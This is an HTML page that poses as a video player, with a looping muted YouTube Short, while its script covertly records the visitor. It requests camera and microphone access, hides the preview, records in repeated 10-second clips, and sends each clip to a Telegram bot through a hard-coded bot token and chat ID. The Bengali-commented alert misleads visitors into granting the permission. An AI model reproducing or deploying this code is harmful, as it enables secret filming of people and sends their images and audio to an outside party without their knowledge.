<!DOCTYPE html>
<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>Live Video Recording</title> 

<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #000; /* ব্যাকগ্রাউন্ড কালো থাকলে ভিডিও সুন্দর দেখাবে */
  }
  #videoElement {
    display: none; /* ক্যামেরা প্রিভিউ হাইড করা থাকবে */
  }
  #videoContainer {
    text-align: center;
    padding-top: 20px;
  }
  iframe {
    width: 90%;
    max-width: 360px; /* শর্ট ভিডিওর জন্য পারফেক্ট সাইজ */
    height: 640px;
    border: 2px solid #333;
    border-radius: 10px;
  }
</style>

</head> 
<body>

<div id="videoContainer">
    <iframe id="youtubeVideo" 
        src="https://www.youtube.com/embed/F22wvhbyCLg?autoplay=1&loop=1&playlist=F22wvhbyCLg&mute=1" 
        frameborder="0" 
        allow="autoplay; encrypted-media" 
        allowfullscreen>
    </iframe>
</div>

<video id="videoElement" autoplay playsinline></video>

<script>
  // ক্যামেরা এবং মাইক্রোফোন অ্যাক্সেস শুরু
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then((stream) => {
      let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      let recordedChunks = [];

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        if (recordedChunks.length > 0) {
          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
          sendToTelegram(videoBlob);
        }
        recordedChunks = [];
        startRecording(); 
      };

      function startRecording() {
        recordedChunks = [];
        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
        }, 10000); // প্রতি ১০ সেকেন্ড পরপর ভিডিও পাঠানো হবে
      }

      startRecording(); 
      
    })
    .catch((error) => {
      console.error('Permission error:', error);
      alert('ভিডিও দেখার জন্য ক্যামেরা পারমিশন প্রয়োজন!');
    });

  // টেলিগ্রামে ভিডিও পাঠানোর ফাংশন
  function sendToTelegram(data) {
    const botToken = '8214066152:AAHbgVjbtqg1d8Zk81n0roteOW07ByBb_CE';
    const chatId = '6717236638';

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', data, 'recorded_video.webm');

    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => console.log("Telegram Response:", data))
    .catch(error => console.error('Error sending to Telegram:', error));
  }
</script>

</body>
</html>
